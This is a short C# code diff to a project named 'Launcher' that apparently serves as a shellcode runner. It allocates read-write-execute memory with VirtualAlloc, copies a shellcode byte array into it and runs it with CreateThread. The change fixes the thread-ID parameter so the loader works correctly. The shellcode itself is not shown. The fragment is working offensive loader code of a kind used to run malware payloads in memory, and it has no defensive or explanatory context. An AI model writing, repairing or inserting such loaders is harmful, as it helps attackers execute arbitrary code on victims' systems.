@@ -18,7 +18,7 @@ namespace Launcher
             IntPtr lpStartAddress,
             IntPtr param,
             UInt32 dwCreationFlags,
-            UInt32 lpThreadId
+            ref UInt32 lpThreadId
         );
 
 
@@ -56,7 +56,8 @@ namespace Launcher
             IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
             Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
             IntPtr thread = IntPtr.Zero;
-            thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, 0);
+            UInt32 threadId = 0;
+            thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
             WaitForSingleObject(thread, 0xFFFFFFFF);
         }
 
